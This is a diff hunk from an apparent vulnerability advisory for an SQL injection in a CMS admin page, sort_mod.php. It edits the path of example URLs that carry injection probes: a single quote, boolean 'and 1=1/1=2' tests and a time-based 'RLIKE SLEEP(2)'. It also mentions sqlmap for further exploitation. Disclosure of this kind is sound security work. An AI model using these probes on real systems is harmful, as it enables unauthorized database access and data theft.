@@ -18,9 +18,9 @@ affected reason:
 affected executable: 
   After Signing in to the background in advance. Then: 
   Like this: 
-             http://xx.xx.com/cms/5/admin/news/sort_mod.php?id=1'
-             http://xx.xx.com/cms/5/admin/news/sort_mod.php?id=1 and 1=1
-             http://xx.xx.com/cms/5/admin/news/sort_mod.php?id=1 and 1=2
-             http://xx.xx.com/cms/5/admin/news/sort_mod.php?id=1 RLIKE SLEEP(2)
+             http://xx.xx.com/admin/news/sort_mod.php?id=1'
+             http://xx.xx.com/admin/news/sort_mod.php?id=1 and 1=1
+             http://xx.xx.com/admin/news/sort_mod.php?id=1 and 1=2
+             http://xx.xx.com/admin/news/sort_mod.php?id=1 RLIKE SLEEP(2)
              
 Then, we can use tools like sqlmap for more information.
